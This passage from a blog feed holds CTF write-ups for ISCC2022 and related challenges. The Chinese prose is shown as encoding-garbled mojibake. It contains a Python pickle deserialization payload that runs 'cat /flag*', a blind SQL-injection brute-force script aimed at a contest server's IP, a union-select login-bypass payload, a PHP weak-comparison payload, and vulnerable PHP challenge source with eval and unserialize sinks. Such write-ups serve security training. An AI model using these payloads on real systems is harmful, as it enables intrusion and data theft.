pickleimport configdef <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">People</span><span class="token punctuation">(</span><span class="token keyword type-casting">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token class-name return-type">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>config<span class="token operator">.</span>backdoor<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"os.popen('cat /flag*').read()"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token function">People</span><span class="token punctuation">(</span><span class="token punctuation">)</span>c <span class="token operator">=</span> pickle<span class="token operator">.</span><span class="token function">dumps</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token operator">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2022</title>
      <link href="/posts/8cbc7f95.html"/>
      <url>/posts/8cbc7f95.html</url>
      
        <content type="html"><![CDATA[<h3 id="Easy-SQL"><a href="#Easy-SQL" class="headerlink" title="Easy-SQL"></a>Easy-SQL</h3><p>selectè¢«banäº†ï¼Œåªèƒ½å…ˆå°è¯•æå‡ºæ•°æ®åº“äº†</p><pre class="line-numbers language-none"><code class="language-none">databaseï¼šsecurityuserï¼štestversionï¼š8.0.28<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ²¡æœ‰selectåªèƒ½çœ‹MySQL8çš„æ–°ç‰¹æ€§äº†</p><p>ä½¿ç”¨mysql8.xçš„æ–°å¢å‘½ä»¤valuesç›´æ¥unionè¾“å‡º</p><p><strong>ç³»ç»Ÿè¡¨æ›´æ¢ä¸ºInnoDBè¡¨</strong></p><p>ç³»ç»Ÿè¡¨å…¨éƒ¨æ¢æˆäº‹åŠ¡å‹çš„innodbè¡¨ï¼Œé»˜è®¤çš„MySQLå®ä¾‹å°†ä¸åŒ…å«ä»»ä½•MyISAMè¡¨ï¼Œé™¤éæ‰‹åŠ¨åˆ›å»ºMyISAMè¡¨</p><p><strong>TABLE STATEMENT</strong></p><p>tableè¯­å¥æ˜¯mysql8.0.19å¼•å…¥çš„è¯­å¥ï¼Œä½œç”¨æ˜¯è¿”å›è¡¨çš„å…¨éƒ¨å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¿”å›è¡¨çš„è¡Œå’Œåˆ—</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">table</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">union</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>VALUES STATEMENT</strong></p><p>valuesè¯­å¥é€šè¿‡ç»™å‡ºå€¼çš„æ–¹å¼ç›´æ¥ç»„æˆä¸€ä¸ªè¡¨ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æŠŠä¸€ä¸ªæˆ–è€…å¤šä¸ªæ•°æ®ä½œä¸ºè¡¨æ¥å±•ç¤ºå‡ºæ¥ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªè¡¨æ•°æ®,å½“ç”¨unionæŸ¥è¯¢æ—¶ï¼Œåˆ—æ•°å¦‚æœä¸å¯¹ä¼šå‘ç”ŸæŠ¥é”™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ©ç”¨<code>?id=0||(&#39;~&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)&gt;(table information_schema.columns limit 1)</code></p><p>æ‰¾åˆ°information_schema.columnsä¸­å…±æœ‰22åˆ—æ•°æ®ï¼Œè„šæœ¬çˆ†ç ´å‡ºè¡¨å</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://59.110.159.206:7010/?id="</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">732</span><span class="token punctuation">,</span> <span class="token number">740</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    table <span class="token operator">=</span> <span class="token string">""</span>    column <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">732</span><span class="token punctuation">,</span> <span class="token number">739</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                ttable <span class="token operator">=</span> table <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                com <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0||('def','security','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ttable<span class="token punctuation">&#125;</span></span><span class="token string">','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1)"</span></span>                tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> com<span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token keyword">if</span> <span class="token string">"Dumb"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>                    table <span class="token operator">=</span> table <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>                    <span class="token keyword">break</span>            com <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0||('def','security','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1)"</span></span>            tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> com<span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">if</span> <span class="token string">"Dumb"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>                <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        tcolumn <span class="token operator">=</span> column <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                        com <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0||('def','security','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tcolumn<span class="token punctuation">&#125;</span></span><span class="token string">','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1)"</span></span>                        tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> com<span class="token punctuation">)</span><span class="token punctuation">.</span>text                        <span class="token keyword">if</span> <span class="token string">"Dumb"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>                            column <span class="token operator">=</span> column <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                            <span class="token keyword">break</span>                    com <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0||('def','security','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>column <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1)"</span></span>                    tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> com<span class="token punctuation">)</span><span class="token punctuation">.</span>text                    <span class="token keyword">if</span> <span class="token string">"Dumb"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>table <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> column<span class="token punctuation">)</span>                        <span class="token keyword">break</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ—ååŒæ ·</p><pre class="line-numbers language-none"><code class="language-none">securityusersIDUSERNAMEPASSWDemailsGQ&#x3D;flagGFe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨union tableæ¥æå‡ºé‚®ç®±</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;0 union (table security.emails limit 7,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-04">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-04</a> 16.00.43.png)</p><p>çœ‹æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"./config.php"</span><span class="token punctuation">;</span><span class="token comment">// error_reporting(0);</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connection failed: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Where is the database?"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"try ?id"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">sqlWaf</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|&lt;|;|"|\^|\||\ |\'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from users where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/is'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No select!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h3>&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h3>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;br>Error!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sqlWaf</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'damn hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND passwd= '$&#123;passwd&#125;'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username or passwd wrong, are you admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"wrong user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user not exist or wrong passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦æ±‚ç»“æœä¸­æŸ¥è¯¢å‡ºçš„ç”¨æˆ·åä¸ºadminå¹¶ä¸”æäº¤çš„å¯†ç å’ŒæŸ¥è¯¢çš„å¯†ç ç›¸åŒæ‰èƒ½æ‹¿åˆ°flagï¼Œåœ¨passwdå¤„åšäº†è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨usernameå¤„è¿›è¡Œæ³¨å…¥å°±è¡Œäº†ï¼Œåœ¨ä¸Šé¢å·²ç»å¾—åˆ°äº†usersè¡¨å…±æœ‰ä¸‰åˆ—ï¼Œç›´æ¥union selectæ„é€ æˆ‘ä»¬è‡ªå·±çš„usernameå’Œpasswd</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTusername&#x3D;&#39;union select &#39;1&#39;,&#39;admin&#39;,&#39;1&#39;%23&amp;passwd&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å†¬å¥¥ä¼š"><a href="#å†¬å¥¥ä¼š" class="headerlink" title="å†¬å¥¥ä¼š"></a>å†¬å¥¥ä¼š</h3><p>array_searchå¼±æ¯”è¾ƒï¼Œä¼ å…¥æ•°å­—å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:?Information&#x3D;&#123;&quot;year&quot;:&quot;2022a&quot;,&quot;items&quot;:[0,[1,2],1]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token variable">$un0</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$un1</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$un2</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$un3</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$un4</span><span class="token punctuation">;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un3</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'unserialize'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                 <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>             <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                 <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">un0</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your output: '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un4</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">include</span> <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un2</span><span class="token operator">.</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸç”Ÿç±»ååºåˆ—åŒ–ï¼Œå…ˆç”¨ä¼ªåè®®è¯»å‡ºæç¤º</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" 